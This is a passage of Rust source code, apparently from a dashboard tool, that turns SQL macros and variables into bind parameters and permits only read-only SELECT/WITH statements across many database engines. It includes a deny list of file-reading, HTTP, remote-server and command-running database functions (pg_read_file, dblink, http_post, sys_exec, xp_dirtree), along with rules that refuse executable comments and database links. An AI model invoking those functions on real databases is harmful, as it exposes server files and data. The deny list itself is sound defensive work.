//! Shared SQL handling: macros and variables become bind parameters (never text in the query),
//! and the statement check accepts exactly one read-only `SELECT`/`WITH`.
//!
//! The scanner only decides where substitutions happen; it skips strings, quoted identifiers
//! and comments the way the engine does. If it ever disagrees with the engine, the result is a
//! syntax error or a wrong parameter count, never user input inside the SQL text, because values
//! are only ever bound. The real defence remains a read-only database login (and a read-only
//! transaction where the engine has one); this check is the second line.

use std::collections::{BTreeMap, BTreeSet};
use std::ops::ControlFlow;

use serde_json::Value;
use sqlparser::ast::{
    BinaryOperator, Expr, ObjectName, ObjectNamePart, Query, Select, SetExpr, Statement, TableAlias, TableFactor,
    Visit, Visitor,
};
use sqlparser::dialect::{
    BigQueryDialect, ClickHouseDialect, DatabricksDialect, Dialect, MsSqlDialect, MySqlDialect, OracleDialect,
    PostgreSqlDialect, SQLiteDialect, SnowflakeDialect,
};
use sqlparser::keywords::Keyword;
use sqlparser::parser::Parser;
use sqlparser::tokenizer::{Token, Tokenizer};

use crate::shapes::TimeRange;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Engine {
    Postgres,
    MySql,
    Sqlite,
    MsSql,
    /// ClickHouse over HTTP: values are sent as query parameters (`{p1:Int64}`, `param_p1=...`).
    ClickHouse,
    /// Apache DataFusion, the SQL engine of InfluxDB 3: values are sent as named parameters
    /// (`$p1`), each cast to its type so the engine never has to guess one.
    DataFusion,
    /// Oracle Database: values are bound by position (`:1`); times as UTC text that
    /// `TO_TIMESTAMP` reads, intervals as seconds that `NUMTODSINTERVAL` reads.
    Oracle,
    /// Google BigQuery (GoogleSQL) over its REST API: positional query parameters (`?`), times
    /// as `TIMESTAMP_MILLIS(?)`.
    BigQuery,
    /// Snowflake over its SQL API: positional bindings (`?`), times as `TO_TIMESTAMP_TZ(?, 3)`.
    Snowflake,
    /// Databricks SQL over its Statement Execution API: named parameter markers (`:p1`), times as
    /// `timestamp_millis(:p1)`.
    Databricks,
}

impl Engine {
    /// The warehouse engines, which share ClickHouse's strict rules for `$`: a `$` stands only in
    /// Kalzit's own `$name`, `${name}` and `$__` macros (Snowflake's `$$` strings, `$1` columns
    /// and `SYSTEM$` functions are refused).
    fn strict_dollar(self) -> bool {
        matches!(self, Engine::ClickHouse | Engine::BigQuery | Engine::Snowflake | Engine::Databricks)
    }
}

/// Why a query is not run, answered as `query_rejected` with its reason code.
pub use super::detail::Detail as Rejected;

fn reject<T>(reason: &'static str, msg: impl Into<String>) -> Result<T, Rejected> {
    Err(Rejected::new(reason, msg))
}

/// Above this, a number in a SQLite time column is Unix milliseconds, below it Unix seconds; the
/// same rule the SQLite source reads time values by.
pub const SQLITE_EPOCH_MS_ABOVE: i64 = 100_000_000_000;

/// A value bound to one placeholder. Each engine converts it to its own types.
#[derive(Clone, Debug, PartialEq)]
pub enum Bind {
    Null,
    Bool(bool),
    Int(i64),
    Float(f64),
    Text(String),
    /// Unix milliseconds, bound as the engine's timestamp type.
    Time(i64),
    /// Milliseconds, bound as an interval where the engine has one (PostgreSQL), else as text
    /// such as "30s".
    Interval(i64),
}

#[derive(Debug, PartialEq)]
pub struct Prepared {
    /// The statement as sent: macros and variables replaced by placeholders.
    pub sql: String,
    pub binds: Vec<Bind>,
    /// The gaps to fill in the result, from the first `$__timeGroup(col, interval, fill)` that
    /// names a fill (`frame::FrameBuilder::fill_gaps`).
    pub fill: Option<Fill>,
    /// The statement with a marker per bound value, for an engine that wraps some placeholders
    /// once it knows the types the database expects (`with_casts`).
    marked: String,
}

/// How `$__timeGroup(col, interval, fill)` fills the buckets of the time range without a row.
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum FillMode {
    /// A row with empty values.
    Null,
    /// A row with the values of the row before.
    Previous,
    /// A row with this number in every number column.
    Value(f64),
}

/// Buckets of `step_ms` from the bucket holding `from` up to `to`, filled with `mode`.
#[derive(Clone, Copy, Debug, PartialEq)]
pub struct Fill {
    pub step_ms: i64,
    pub mode: FillMode,
    pub from: i64,
    pub to: i64,
}

impl Prepared {
    /// The statement as sent, with the placeholders of `casts` (counted from 1) written as
    /// `CAST(CAST(<placeholder> AS <bound type>) AS <expected type>)`, checked like the original.
    /// The type names come from the database, already quoted where they need it; PostgreSQL
    /// uses this for values whose bound type differs from the one it infers for the placeholder.
    pub fn with_casts(&self, engine: Engine, casts: &BTreeMap<usize, (&str, String)>) -> Result<String, Rejected> {
        let sql = render(&self.marked, &self.binds, |n, b| {
            let placeholder = engine_placeholder(engine, n, b, false);
            match casts.get(&n) {
                Some((bound, expected)) => format!("CAST(CAST({placeholder} AS {bound}) AS {expected})"),
                None => placeholder,
            }
        })?;
        check_statement(&sql, engine)?;
        Ok(sql)
    }
}

/// What macros and variables expand from.
pub struct Context<'a> {
    pub range: TimeRange,
    pub interval_ms: u64,
    pub variables: &'a BTreeMap<String, Value>,
    /// Names a variable used as an identifier (`${table:identifier}`) may take, from the
    /// source's schema. `None` when the query uses no identifier variables.
    pub identifiers: Option<&'a BTreeSet<String>>,
    /// The variables that may be used as identifiers at all; `None` allows every variable
    /// (free queries, where the caller writes the query anyway). A dashboard's stored queries
    /// allow only variables whose value the server checked against the dashboard's own list.
    pub identifier_variables: Option<&'a BTreeSet<String>>,
}

/// Functions that read or write files, reach other servers, run SQL given as text (which would
/// escape this check), load code or act on other sessions. Matched case-insensitively on the last
/// part of the name, for every engine: a name dangerous in one engine means nothing in another.
const FORBIDDEN_FUNCTIONS: &[&str] = &[
    // MySQL/MariaDB
    "load_file",
    "sys_exec",
    "sys_eval",
    // MySQL/MariaDB named locks outlive the query on a pooled session.
    "get_lock",
    "release_lock",
    "release_all_locks",
    // PostgreSQL: files and directories
    "pg_read_file",
    "pg_read_binary_file",
    "pg_stat_file",
    "pg_ls_dir",
    "pg_ls_logdir",
    "pg_ls_waldir",
    "pg_ls_tmpdir",
    "pg_ls_archive_statusdir",
    "pg_file_write",
    "pg_file_rename",
    "pg_file_unlink",
    "pg_logdir_ls",
    // PostgreSQL: large objects (files on the server, and writes)
    "lo_import",
    "lo_export",
    "lo_create",
    "lo_creat",
    "lo_unlink",
    "lo_put",
    "lo_from_bytea",
    "lo_open",
    "lowrite",
    // PostgreSQL: other servers, SQL given as text, other sessions, configuration
    "dblink",
    "dblink_exec",
    "dblink_connect",
    "dblink_connect_u",
    "dblink_open",
    "dblink_send_query",
    // PostgreSQL: the pgsql-http extension sends HTTP requests from the database.
    "http",
    "http_get",
    "http_post",
    "http_put",
    "http_patch",
    "http_delete",
    "http_head",
    "http_set_curlopt",
    "http_reset_curlopt",
    "http_list_curlopt",
    "query_to_xml",
    "query_to_xmlschema",
    "query_to_xml_and_xmlschema",
    "cursor_to_xml",
    "ts_stat",
    "pg_terminate_backend",
    "pg_cancel_backend",
    "pg_reload_conf",
    "pg_rotate_logfile",
    "pg_promote",
    "set_config",
    "pg_switch_wal",
    "pg_switch_xlog",
    "pg_create_restore_point",
    "pg_log_backend_memory_contexts",
    "pg_backup_start",
    "pg_backup_stop",
    "pg_start_backup",
    "pg_stop_backup",
    "pg_wal_replay_pause",
    "pg_wal_replay_resume",
    "pg_notify",
    "pg_import_system_collations",
    "pg_sync_replication_slots",
    "pg_replication_slot_advance",
    "pg_logical_emit_message",
    "pg_stat_statements_reset",
    "pg_file_sync",
    "nextval",
    "setval",
    // SQL Server
    "openrowset",
    "opendatasource",
    "openquery",
    "fn_get_audit_file",
    "fn_xe_file_target_read_file",
    "fn_trace_gettable",
    // SQL Server: the server's file system
    "dm_os_enumerate_filesystem",
    "dm_os_file_exists",
    "xp_dirtree",
    "xp_fileexist",
    "xp_subdirs",
    // SQLite
    "load_extension",
    "readfile",
    "writefile",
    "edit",
    "fts3_tokenizer",
];

/// One piece of the scanned query.
#[derive(Debug, PartialEq)]
enum Piece<'s> {
    /// SQL text passed through unchanged.
    Text(&'s str),
    /// `$__timeFilter(col)`, with the column expression.
    TimeFilter(&'s str),
    TimeFrom,
    TimeTo,
    Interval,
    IntervalMs,
    /// `$__time(col)` (`epoch` false) or `$__timeEpoch(col)`, named `time`.
    TimeColumn {
        col: &'s str,
        epoch: bool,
    },
    /// `$__timeGroup(col, interval[, fill])`, and with `alias` `$__timeGroupAlias(...)`.
    TimeGroup {
        col: &'s str,
        interval: IntervalArg<'s>,
        fill: Option<FillMode>,
        alias: bool,
    },
    /// `$__unixEpochFilter(col)`, in nanoseconds with `nanos` (`$__unixEpochNanoFilter`).
    UnixEpochFilter {
        col: &'s str,
        nanos: bool,
    },
    UnixEpochFrom,
    UnixEpochTo,
    UnixEpochNanoFrom,
    UnixEpochNanoTo,
    /// `$__unixEpochGroup(col, interval)`, and with `alias` `$__unixEpochGroupAlias(...)`.
    UnixEpochGroup {
        col: &'s str,
        interval: IntervalArg<'s>,
        alias: bool,
    },
    /// `$name` or `${name}`.
    Variable(&'s str),
    /// `${name:identifier}`.
    Identifier(&'s str),
}

/// The interval argument of a grouping macro, checked as a duration before it reaches the SQL.
#[derive(Clone, Copy, Debug, PartialEq)]
enum IntervalArg<'s> {
    /// A written duration such as `1h` or `'5m'`, in milliseconds.
    Ms(i64),
    /// `$__interval`: the interval of the request.
    Auto,
    /// `$name` or `${name}`: a variable whose value must be a duration (an interval variable).
    Variable(&'s str),
}

/// The query form of every SQL kind: `{"sql": "SELECT ..."}`.
#[derive(Debug, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SqlQuery {
    pub sql: String,
}

/// Prepares a SQL kind's query: macros, variables (identifier variables against the source's
/// schema) and the statement check.
pub async fn prepare_query(
    plugin: &dyn super::DataSourcePlugin,
    conn: &super::Connection,
    req: &super::SourceQuery,
    engine: Engine,
) -> Result<Prepared, super::SourceError> {
    let query: SqlQuery = req.parse()?;
    let identifiers = if uses_identifier_variables(&query.sql, engine) {
        Some(plugin.schema(conn).await?.identifiers())
    } else {
        None
    };
    let ctx = Context {
        range: req.range,
        interval_ms: req.interval_ms,
        variables: &req.variables,
        identifiers: identifiers.as_ref(),
        identifier_variables: req.identifier_variables.as_ref(),
    };
    Ok(prepare(&query.sql, engine, &ctx)?)
}

/// Expands macros and variables into bind parameters and checks the statement.
pub fn prepare(sql: &str, engine: Engine, ctx: &Context<'_>) -> Result<Prepared, Rejected> {
    // NUL marks Kalzit's own placeholders below, so it may not appear in the query itself.
    if sql.contains(MARK) {
        return reject("sql.nul_character", "the query contains a NUL character");
    }
    let pieces = scan(sql, engine)?;
    // The statement with a marker per bound value; the text sent and the text checked are both
    // made from it, so they differ exactly at the values Kalzit bound and nowhere else.
    let mut out = String::with_capacity(sql.len() + 16);
    let mut binds = Vec::new();
    let mut fill = None;
    let placeholder = |binds: &mut Vec<Bind>, value: Bind| {
        binds.push(value);
        format!("{MARK}{}{MARK}", binds.len())
    };
    for piece in &pieces {
        match piece {
            Piece::Text(t) => out.push_str(t),
            Piece::TimeFilter(col) if engine == Engine::Sqlite => {
                // SQLite has no time type: a column holds text (ISO 8601 with "T" or a space,
                // with or without a zone) or Unix seconds or milliseconds as numbers. Text
                // compares as a time through julianday (exact to the millisecond, like SQLite's
                // own clock), numbers as Unix milliseconds; comparing as text would cut ISO
                // values with "T" at the edges and match no number at all.
                //
                // In front of that exact test, plain ranges an index on the column can serve:
                // the range in seconds, in milliseconds, and as text from the day before to the
                // day after (zone offsets stay within a day). Each holds at least every value the
                // exact test lets through, so the result is the same, only found faster.
                let (from_ms, to_ms) = (ctx.range.from, ctx.range.to);
                let day = |ms: i64, days: i64, fallback: &str| {
                    chrono::DateTime::from_timestamp_millis(ms.saturating_add(days * 86_400_000))
                        .map_or_else(|| fallback.to_string(), |t| t.format("%Y-%m-%d").to_string())
                };
                let s_lo = placeholder(&mut binds, Bind::Float((from_ms - 1) as f64 / 1000.0));
                let s_hi = placeholder(&mut binds, Bind::Float((to_ms + 1) as f64 / 1000.0));
                let ms_lo = placeholder(&mut binds, Bind::Int(from_ms));
                let ms_hi = placeholder(&mut binds, Bind::Int(to_ms));
                let text_lo = placeholder(&mut binds, Bind::Text(day(from_ms, -1, "")));
                let text_hi = placeholder(&mut binds, Bind::Text(day(to_ms, 2, "~")));
                let exact_lo = placeholder(&mut binds, Bind::Int(from_ms));
                let exact_hi = placeholder(&mut binds, Bind::Int(to_ms));
                let from = placeholder(&mut binds, Bind::Time(from_ms));
                let to = placeholder(&mut binds, Bind::Time(to_ms));
                out.push_str(&format!(
                    "(({col} BETWEEN {s_lo} AND {s_hi} OR {col} BETWEEN {ms_lo} AND {ms_hi} \
                     OR {col} BETWEEN {text_lo} AND {text_hi}) \
                     AND (CASE WHEN typeof({col}) IN ('integer', 'real') \
                     THEN (CASE WHEN abs({col}) > {SQLITE_EPOCH_MS_ABOVE} THEN {col} ELSE {col} * 1000 END) \
                     BETWEEN {exact_lo} AND {exact_hi} \
                     ELSE julianday({col}) BETWEEN julianday({from}) AND julianday({to}) END))"
                ));
            }
            Piece::TimeFilter(col) => {
                let from = placeholder(&mut binds, Bind::Time(ctx.range.from));
                let to = placeholder(&mut binds, Bind::Time(ctx.range.to));
                out.push_str(&format!("({col} BETWEEN {from} AND {to})"));
            }
            Piece::TimeFrom => out.push_str(&placeholder(&mut binds, Bind::Time(ctx.range.from))),
            Piece::TimeTo => out.push_str(&placeholder(&mut binds, Bind::Time(ctx.range.to))),
            Piece::Interval => out.push_str(&placeholder(&mut binds, Bind::Interval(ctx.interval_ms as i64))),
            Piece::IntervalMs => out.push_str(&placeholder(&mut binds, Bind::Int(ctx.interval_ms as i64))),
            Piece::TimeColumn { col, epoch } => {
                let value = if *epoch { epoch_seconds(engine, col) } else { (*col).to_string() };
                out.push_str(&format!("{value} AS {}", time_alias(engine)));
            }
            Piece::TimeGroup { col, interval, fill: mode, alias } => {
                let seconds = group_seconds(ctx, interval)?;
                out.push_str(&time_group(engine, col, seconds));
                if *alias {
                    out.push_str(&format!(" AS {}", time_alias(engine)));
                }
                if let Some(mode) = mode
                    && fill.is_none()
                {
                    fill = Some(Fill { step_ms: seconds * 1000, mode: *mode, from: ctx.range.from, to: ctx.range.to });
                }
            }
            Piece::UnixEpochFilter { col, nanos } => {
                let (from, to) = if *nanos {
                    (ctx.range.from.saturating_mul(1_000_000), ctx.range.to.saturating_mul(1_000_000))
                } else {
                    (ctx.range.from.div_euclid(1000), ctx.range.to.div_euclid(1000))
                };
                let from = placeholder(&mut binds, Bind::Int(from));
                let to = placeholder(&mut binds, Bind::Int(to));
                out.push_str(&format!("({col} >= {from} AND {col} <= {to})"));
            }
            Piece::UnixEpochFrom => out.push_str(&placeholder(&mut binds, Bind::Int(ctx.range.from.div_euclid(1000)))),
            Piece::UnixEpochTo => out.push_str(&placeholder(&mut binds, Bind::Int(ctx.range.to.div_euclid(1000)))),
            Piece::UnixEpochNanoFrom => {
                out.push_str(&placeholder(&mut binds, Bind::Int(ctx.range.from.saturating_mul(1_000_000))))
            }
            Piece::UnixEpochNanoTo => {
                out.push_str(&placeholder(&mut binds, Bind::Int(ctx.range.to.saturating_mul(1_000_000))))
            }
            Piece::UnixEpochGroup { col, interval, alias } => {
                let seconds = group_seconds(ctx, interval)?;
                out.push_str(&unix_epoch_group(engine, col, seconds));
                if *alias {
                    out.push_str(&format!(" AS {}", time_alias(engine)));
                }
            }
            Piece::Variable(name) => {
                let value = variable(ctx, name)?;
                let values = match value {
                    Value::Array(items) if items.is_empty() => vec![Bind::Null],
                    Value::Array(items) => items.iter().map(|v| scalar(name, v)).collect::<Result<_, _>>()?,
                    other => vec![scalar(name, other)?],
                };
                let parts: Vec<String> = values.into_iter().map(|v| placeholder(&mut binds, v)).collect();
                out.push_str(&parts.join(", "));
            }
            Piece::Identifier(name) => {
                if ctx.identifier_variables.is_some_and(|allowed| !allowed.contains(*name)) {
                    return Err(Rejected::new(
                        "sql.identifier_variable_not_allowed",
                        format!(
                            "variable {name} cannot be an identifier here; only custom and constant dashboard \
                             variables can"
                        ),
                    )
                    .with("name", name));
                }
                let value = variable(ctx, name)?;
                let allowed = ctx.identifiers.ok_or_else(|| {
                    Rejected::new("sql.identifier_needs_schema", "identifier variables need the schema")
                })?;
                let names: Vec<&Value> = match value {
                    Value::Array(items) => items.iter().collect(),
                    other => vec![other],
                };
                if names.is_empty() {
                    return Err(Rejected::new("sql.variable_missing", format!("variable {name} has no value"))
                        .with("name", name));
                }
                let mut quoted = Vec::new();
                for n in names {
                    let Some(n) = n.as_str().filter(|n| allowed.contains(*n)) else {
                        return Err(Rejected::new(
                            "sql.identifier_unknown",
                            format!("variable {name} is not a table or column of this data source"),
                        )
                        .with("name", name));
                    };
                    quoted.push(quote_identifier(engine, n)?);
                }
                out.push_str(&quoted.join(", "));
            }
        }
    }
    let sent = render(&out, &binds, |n, b| engine_placeholder(engine, n, b, false))?;
    let checked = render(&out, &binds, |n, b| engine_placeholder(engine, n, b, true))?;
    check_statement(&checked, engine)?;
    if engine == Engine::ClickHouse {
        same_structure(&sent, &checked)?;
    }
    Ok(Prepared { sql: sent, binds, fill, marked: out })
}

/// Marks a bound value in the statement while it is built (`prepare`).
const MARK: char = '\0';

/// The statement with each marker replaced by `placeholder(n)`.
fn render(marked: &str, binds: &[Bind], placeholder: impl Fn(usize, &Bind) -> String) -> Result<String, Rejected> {
    let broken = || Rejected::new("sql.check_mismatch", "the query could not be checked as it would run");
    let mut out = String::with_capacity(marked.len() + 16);
    let mut parts = marked.split(MARK);
    out.push_str(parts.next().unwrap_or_default());
    while let Some(n) = parts.next() {
        let rest = parts.next().ok_or_else(broken)?;
        let n: usize = n.parse().map_err(|_| broken())?;
        let bind = n.checked_sub(1).and_then(|i| binds.get(i)).ok_or_else(broken)?;
        out.push_str(&placeholder(n, bind));
        out.push_str(rest);
    }
    Ok(out)
}

/// The text sent and the text checked must tokenize alike, except that each `?` of the checked
/// text is one ClickHouse parameter `{name:Type}` in the sent one: a guard that the checked
/// statement is the statement ClickHouse runs.
fn same_structure(sent: &str, checked: &str) -> Result<(), Rejected> {
    let tokens = |text: &str| {
        Tokenizer::new(&ClickHouseDialect {}, text).tokenize().map_err(|e| {
            Rejected::new("sql.parse_error", format!("the query could not be checked: {e}")).with("detail", e)
        })
    };
    let (sent, checked) = (tokens(sent)?, tokens(checked)?);
    let differ = || Rejected::new("sql.check_mismatch", "the query could not be checked as it would run");
    let mut s = sent.iter();
    for c in &checked {
        let Some(next) = s.next() else { return Err(differ()) };
        if matches!(c, Token::Placeholder(p) if p == "?") {
            if *next != Token::LBrace {
                return Err(differ());
            }
            // A parameter's type may hold parentheses (`Nullable(String)`), never braces.
            loop {
                match s.next() {
                    Some(Token::RBrace) => break,
                    Some(Token::LBrace) | None => return Err(differ()),
                    Some(_) => {}
                }
            }
        } else if next != c {
            return Err(differ());
        }
    }
    if s.next().is_some() { Err(differ()) } else { Ok(()) }
}

/// The placeholder of the `n`th bound value (counted from 1), as the engine writes it.
fn engine_placeholder(engine: Engine, n: usize, value: &Bind, check: bool) -> String {
    // The checker's parser does not know ClickHouse's `{p1:Int64}`; the checked text has a plain
    // `?` where the sent one has the parameter, inside the same expression (`check`).
    let ch = |ty: &str| if check { "?".to_string() } else { format!("{{p{n}:{ty}}}") };
    // PostgreSQL's dialect reads `$p1` as a placeholder, so DataFusion checks what it sends.
    let df = || format!("$p{n}");
    match engine {
        Engine::Postgres => format!("${n}"),
        Engine::MsSql => format!("@P{n}"),
        Engine::MySql | Engine::Sqlite => "?".to_string(),
        // ClickHouse parses each parameter's text as the type written here. Times travel as Unix
        // milliseconds, intervals as whole seconds where they fit (DateTime columns take no
        // millisecond intervals), else as milliseconds (`clickhouse::param_value`).
        Engine::ClickHouse => match value {
            Bind::Null => ch("Nullable(String)"),
            Bind::Bool(_) => ch("Bool"),
            Bind::Int(_) => ch("Int64"),
            Bind::Float(_) => ch("Float64"),
            Bind::Text(_) => ch("String"),
            Bind::Time(_) => format!("fromUnixTimestamp64Milli({}, 'UTC')", ch("Int64")),
            Bind::Interval(ms) if ms % 1000 == 0 => format!("toIntervalSecond({})", ch("Int64")),
            Bind::Interval(_) => format!("toIntervalMillisecond({})", ch("Int64")),
        },
        // Each parameter is cast, so DataFusion takes the value's own type instead of checking
        // it against one it inferred (a tag column's dictionary type, say).
        Engine::DataFusion => match value {
            Bind::Null => df(),
            Bind::Bool(_) => format!("CAST({} AS BOOLEAN)", df()),
            Bind::Int(_) => format!("CAST({} AS BIGINT)", df()),
            Bind::Float(_) => format!("CAST({} AS DOUBLE)", df()),
            Bind::Text(_) => format!("CAST({} AS VARCHAR)", df()),
            Bind::Time(_) => format!("CAST({} AS TIMESTAMP)", df()),
            Bind::Interval(_) => format!("CAST({} AS INTERVAL)", df()),
        },
        // `oracle::bind_value` sends times as `2026-10-29 12:00:00.000` (UTC) and intervals as
        // seconds; the format is spelled out, so no session setting changes what is read.
        Engine::Oracle => match value {
            Bind::Time(_) => format!("TO_TIMESTAMP(:{n}, 'YYYY-MM-DD HH24:MI:SS.FF3')"),
            Bind::Interval(_) => format!("NUMTODSINTERVAL(:{n}, 'SECOND')"),
            _ => format!(":{n}"),
        },
        // BigQuery takes times as INT64 milliseconds and intervals as INT64 milliseconds turned
        // into an INTERVAL (`bigquery::parameter`).
        Engine::BigQuery => match value {
            Bind::Time(_) => "TIMESTAMP_MILLIS(?)".to_string(),
            Bind::Interval(_) => "INTERVAL ? MILLISECOND".to_string(),
            _ => "?".to_string(),
        },
        // Snowflake reads Unix milliseconds with scale 3; the session runs in UTC. Intervals are
        // text such as `30 seconds` (`interval_words`).
        Engine::Snowflake => match value {
            Bind::Time(_) => "TO_TIMESTAMP_TZ(?, 3)".to_string(),
            _ => "?".to_string(),
        },
        // Databricks: named markers, checked as sent (sqlparser reads `:p1` as a placeholder).
        Engine::Databricks => match value {
            Bind::Time(_) => format!("timestamp_millis(:p{n})"),
            _ => format!(":p{n}"),
        },
    }
}

/// `30 seconds`, `5 minutes`, `250 milliseconds`: an interval as Snowflake and Databricks read
/// it in text (Databricks' `window()` and interval strings).
pub fn interval_words(ms: i64) -> String {
    for (unit, size) in [("day", 86_400_000), ("hour", 3_600_000), ("minute", 60_000), ("second", 1_000)] {
        if ms >= size && ms % size == 0 {
            let n = ms / size;
            return if n == 1 { format!("1 {unit}") } else { format!("{n} {unit}s") };
        }
    }
    if ms == 1 { "1 millisecond".into() } else { format!("{ms} milliseconds") }
}

/// Whether the query uses `${name:identifier}`, so the caller must load the schema first.
pub fn uses_identifier_variables(sql: &str, engine: Engine) -> bool {
    scan(sql, engine).is_ok_and(|p| p.iter().any(|p| matches!(p, Piece::Identifier(_))))
}

fn variable<'v>(ctx: &'v Context<'_>, name: &str) -> Result<&'v Value, Rejected> {
    ctx.variables.get(name).ok_or_else(|| {
        Rejected::new("sql.variable_missing", format!("variable {name} has no value")).with("name", name)
    })
}

fn scalar(name: &str, value: &Value) -> Result<Bind, Rejected> {
    Ok(match value {
        Value::Null => Bind::Null,
        Value::Bool(b) => Bind::Bool(*b),
        Value::Number(n) => match n.as_i64() {
            Some(i) => Bind::Int(i),
            None => Bind::Float(n.as_f64().unwrap_or(f64::NAN)),
        },
        Value::String(s) => Bind::Text(s.clone()),
        Value::Array(_) | Value::Object(_) => {
            return Err(Rejected::new(
                "sql.variable_type",
                format!("variable {name} must be a string, number, boolean or a list of them"),
            )
            .with("name", name));
        }
    })
}

/// A schema name as a quoted identifier. A name with a NUL is refused everywhere (NUL marks
/// bound values in `prepare`); in ClickHouse also one with a backtick, double quote or backslash,
/// as ClickHouse reads escapes inside quoted names that the checker's parser does not; in Oracle
/// one with a double quote, which a quoted Oracle name cannot hold at all.
fn quote_identifier(engine: Engine, name: &str) -> Result<String, Rejected> {
    let refused = |c: &[char]| name.contains(c);
    let quotes_refused = match engine {
        Engine::ClickHouse => refused(&['`', '"', '\\']),
        Engine::Oracle => refused(&['"']),
        Engine::BigQuery => refused(&['`', '\\']),
        Engine::Databricks => refused(&['\\']),
        _ => false,
    };
    if refused(&[MARK]) || quotes_refused {
        return Err(Rejected::new(
            "sql.identifier_characters",
            "this name contains characters Kalzit does not put into a quoted name",
        )
        .with("name", name));
    }
    Ok(name
        .split('.')
        .map(|part| match engine {
            Engine::MySql | Engine::Databricks => format!("`{}`", part.replace('`', "``")),
            Engine::MsSql => format!("[{}]", part.replace(']', "]]")),
            Engine::ClickHouse | Engine::BigQuery => format!("`{part}`"),
            Engine::Postgres | Engine::Sqlite | Engine::DataFusion | Engine::Snowflake | Engine::Oracle => {
                format!("\"{}\"", part.replace('"', "\"\""))
            }
        })
        .collect::<Vec<_>>()
        .join("."))
}

fn is_ident_start(c: char) -> bool {
    c.is_ascii_alphabetic() || c == '_'
}

fn is_ident_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

/// Splits the query into pass-through text and substitutions.
fn scan(sql: &str, engine: Engine) -> Result<Vec<Piece<'_>>, Rejected> {
    // MySQL and MariaDB run the content of these comments as SQL. They are refused anywhere in
    // the text, even inside strings, rather than trusting two parsers to agree on where a
    // comment starts.
    if engine == Engine::MySql && (sql.contains("/*!") || sql.contains("/*M!") || sql.contains("/*m!")) {
        return reject("sql.executable_comment", "MySQL executable comments (/*! ... */) are not allowed");
    }
    let bytes = sql.as_bytes();
    let mut pieces = Vec::new();
    let mut text_start = 0;
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        // Everything the engine treats as opaque is skipped as a whole.
        let skip_to = match c {
            // Raw strings (`r'...'`) of BigQuery and Databricks: a backslash in them is text to
            // one reader and may end the string for another, so it is refused there.
            b'\'' | b'"' if matches!(engine, Engine::BigQuery | Engine::Databricks) && raw_prefix(bytes, i) => {
                Some(skip_raw_string(bytes, i)?)
            }
            // BigQuery's triple-quoted strings.
            b'\'' | b'"' if engine == Engine::BigQuery && bytes[i..].starts_with(&[c, c, c]) => {
                Some(skip_triple_quoted(bytes, i)?)
            }
            b'\'' => Some(skip_string(bytes, i, b'\'', backslash_escapes(engine, bytes, i))?),
            // ClickHouse reads backslash escapes inside quoted names, the checker's parser does not,
            // so the two could end a name at different places: no backslash in them at all.
            b'"' | b'`' if engine == Engine::ClickHouse => Some(skip_clickhouse_name(bytes, i)?),
            // In BigQuery and Databricks double quotes make a string, with backslash escapes.
            b'"' if matches!(engine, Engine::BigQuery | Engine::Databricks) => Some(skip_string(bytes, i, b'"', true)?),
            b'"' => Some(skip_string(bytes, i, b'"', engine == Engine::MySql)?),
            b'`' if engine == Engine::BigQuery => Some(skip_bigquery_name(bytes, i)?),
            b'`' if engine == Engine::Databricks => Some(skip_clickhouse_name(bytes, i)?),
            b'`' if matches!(engine, Engine::MySql | Engine::Sqlite) => Some(skip_string(bytes, i, b'`', false)?),
            // BigQuery comments with `#`; Snowflake's parser reads none (the checker's would).
            b'#' if engine == Engine::BigQuery => Some(skip_line(bytes, i)),
            b'#' if engine == Engine::Snowflake => {
                return reject("sql.hash_comment", "write comments with --; # is not allowed outside strings");
            }
            b'/' if engine == Engine::Snowflake && bytes.get(i + 1) == Some(&b'/') => Some(skip_line(bytes, i)),
            // `@stage` reads files from a Snowflake stage.
            b'@' if engine == Engine::Snowflake => {
                return reject("sql.stage_reference", "stages (@name) are not allowed; Kalzit reads only tables");
            }
            // BigQuery's named parameters (`@name`); `@@` system variables stay.
            b'@' if engine == Engine::BigQuery
                && bytes.get(i + 1).is_some_and(|b| is_ident_start(*b as char))
                && (i == 0 || bytes[i - 1] != b'@') =>
            {
                return reject("sql.placeholder", "write variables as $name; parameter placeholders are not supported");
            }
            b'[' if matches!(engine, Engine::MsSql | Engine::Sqlite) => Some(skip_bracket(bytes, i)?),
            b'-' if bytes.get(i + 1) == Some(&b'-') => match line_comment_after_dashes(sql, i + 2, engine)? {
                true => Some(skip_line(bytes, i)),
                false => None,
            },
            // ClickHouse's `#` comments are not read as comments by the checker's parser, so they are
            // left to it, which refuses them; `--` works in both.
            b'#' if engine == Engine::MySql => Some(skip_line(bytes, i)),
            b'#' if engine == Engine::ClickHouse => {
                return reject("sql.hash_comment", "write comments with --; # is not allowed outside strings");
            }
            // `a$b` is one name in ClickHouse, but Kalzit would read `$b` as a variable.
            b'$' if engine.strict_dollar() && i > 0 && is_ident_char(bytes[i - 1] as char) => {
                return reject("sql.dollar_in_name", "a $ directly after a name is not allowed; leave a space");
            }
            // In Oracle `$` and `#` belong to names (`v$version`), as the checker's parser reads
            // them too: the rest of the name is text, not a variable.
            b'$' | b'#' if engine == Engine::Oracle && i > 0 && is_ident_char(bytes[i - 1] as char) => {
                Some(i + 1 + bytes[i + 1..].iter().position(|b| !oracle_name_char(*b)).unwrap_or(bytes.len() - i - 1))
            }
            // `table@link` reads through a database link from another database.
            b'@' if engine == Engine::Oracle => {
                return reject("sql.database_link", "database links (name@link) are not allowed");
            }
            // q'[...]' strings end at a delimiter the scanner would have to agree on with Oracle.
            b'q' | b'Q' if engine == Engine::Oracle && oracle_q_quote_at(bytes, i) => {
                return reject("sql.quote_delimited_string", "q'...' strings are not allowed; write strings in ''");
            }
            b'/' if bytes.get(i + 1) == Some(&b'*') => Some(skip_block_comment(
                bytes,
                i,
                matches!(
                    engine,
                    Engine::Postgres | Engine::MsSql | Engine::ClickHouse | Engine::DataFusion | Engine::Databricks
                ),
            )?),
            b'$' if engine == Engine::Postgres => dollar_quote_end(sql, i)?,
            // ClickHouse query parameters (`{name:Type}`) written by hand would take values Kalzit
            // never binds; Kalzit writes its own.
            b'{' if engine == Engine::ClickHouse && clickhouse_parameter_at(sql, i) => {
                return reject("sql.placeholder", "write variables as $name; parameter placeholders are not supported");
            }
            // U&"..." and U&'...' spell names and text with escapes the checker would not decode,
            // so a forbidden function could hide behind them.
            b'U' | b'u'
                if engine == Engine::Postgres
                    && bytes.get(i + 1) == Some(&b'&')
